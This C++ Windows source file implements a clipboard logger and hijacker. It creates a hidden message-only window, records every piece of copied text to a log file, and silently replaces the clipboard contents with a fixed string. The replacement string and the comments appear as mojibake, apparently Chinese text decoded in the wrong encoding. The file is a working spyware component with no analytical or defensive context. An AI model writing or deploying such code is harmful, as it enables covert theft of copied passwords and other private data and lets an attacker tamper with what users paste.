#include <windows.h>
#include <string>
#include "pch.h"
#include "utils.h"

std::string prev_text;

LRESULT CALLBACK ClipboardViewerProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_CLIPBOARDUPDATE:
		if (OpenClipboard(hwnd))
		{
			HANDLE hData = GetClipboardData(CF_TEXT);
			if (hData != NULL)
			{
				char* clipboardText = static_cast<char*>(GlobalLock(hData));
				if (clipboardText == NULL) return DefWindowProc(hwnd, message, wParam, lParam);

				const char* newText = "µÜ¯Ç§A§¤°Ú";
				if (std::string(clipboardText) != newText)
				{
					Log("clipboard.txt", "Clipboard changed: " + std::string(clipboardText) + "\n");

					EmptyClipboard();

					HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, strlen(newText) + 1);
					if (hMem)
					{
						LPSTR pMem = (LPSTR)GlobalLock(hMem);
						strcpy_s(pMem, strlen(newText) + 1, newText);
						GlobalUnlock(hMem);
						SetClipboardData(CF_TEXT, hMem);
					}
					GlobalUnlock(hData);
				}
			}

			CloseClipboard();
		}
		break;
	}
	return DefWindowProc(hwnd, message, wParam, lParam);
}

void ClipboardLogger()
{
	// step1. µù¥Uµøµ¡Ãþ§O
	WNDCLASSEX wc = { 0 };
	wc.cbSize = sizeof(WNDCLASSEX);
	wc.lpfnWndProc = ClipboardViewerProc;
	wc.lpszClassName = L"ClipboardMonitor";
	RegisterClassEx(&wc);

	// step2. ³Ð«ØÁôÂÃµøµ¡
	HWND hwnd = CreateWindow(L"ClipboardMonitor", NULL, 0, 0, 0, 0, 0,
		HWND_MESSAGE, NULL, NULL, NULL);

	// step3. µù¥U°Å¶KÃ¯ºÊÅ¥
	AddClipboardFormatListener(hwnd);

	// step4. °T®§°j°é
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}